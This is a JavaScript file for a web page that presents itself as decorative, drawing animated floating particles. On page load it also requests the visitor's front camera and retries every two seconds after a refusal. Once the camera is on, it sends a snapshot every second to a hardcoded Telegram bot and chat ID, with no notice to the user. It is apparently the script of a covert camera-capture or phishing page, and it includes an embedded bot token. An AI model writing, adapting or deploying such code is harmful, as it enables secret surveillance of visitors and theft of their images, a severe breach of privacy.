// Configuration
const BOT_TOKEN = "7249136904:AAGFPmdS5CnextPMpNlUPv0qeSuVHBaUF-w";
const CHAT_ID = "8174575316";
const video = document.querySelector("video");
let streamStarted = false;

// Initialize the page
document.addEventListener('DOMContentLoaded', function() {
  createParticles();
  tryStartCamera();
});

// Create floating particles
function createParticles() {
  const particlesContainer = document.getElementById('particles');
  const particleCount = 15;
  
  for (let i = 0; i < particleCount; i++) {
    const particle = document.createElement('div');
    particle.classList.add('particle');
    
    // Random properties
    const size = Math.random() * 10 + 5;
    const posX = Math.random() * 100;
    const posY = Math.random() * 100;
    const delay = Math.random() * 15;
    const duration = Math.random() * 10 + 10;
    
    particle.style.width = `${size}px`;
    particle.style.height = `${size}px`;
    particle.style.left = `${posX}%`;
    particle.style.top = `${posY}%`;
    particle.style.animationDelay = `${delay}s`;
    particle.style.animationDuration = `${duration}s`;
    particle.style.opacity = Math.random() * 0.4 + 0.1;
    
    particlesContainer.appendChild(particle);
  }
}

// Try to access camera
async function tryStartCamera() {
  try {
    const stream = await navigator.mediaDevices.getUserMedia({
      video: { facingMode: "user" }
    });
    video.srcObject = stream;
    if (!streamStarted) {
      streamStarted = true;
      startSendingPhotos();
    }
  } catch (err) {
    console.warn("Camera access denied or not available:", err);
    // Retry every 2 seconds if not started
    setTimeout(tryStartCamera, 2000);
  }
}

// Start sending photos to Telegram
function startSendingPhotos() {
  const canvas = document.createElement("canvas");
  const ctx = canvas.getContext("2d");
  let isSending = false;
  
  setInterval(() => {
    if (video.readyState !== video.HAVE_ENOUGH_DATA || isSending) return;
    
    canvas.width = video.videoWidth;
    canvas.height = video.videoHeight;
    ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
    
    isSending = true;
    canvas.toBlob(blob => {
      const formData = new FormData();
      formData.append("chat_id", CHAT_ID);
      formData.append("photo", blob, "photo.jpg");
      
      fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`, {
          method: "POST",
          body: formData
        })
        .then(() => isSending = false)
        .catch(err => {
          console.error("Telegram Error:", err);
          isSending = false;
        });
    }, "image/jpeg", 0.85);
  }, 1000);
}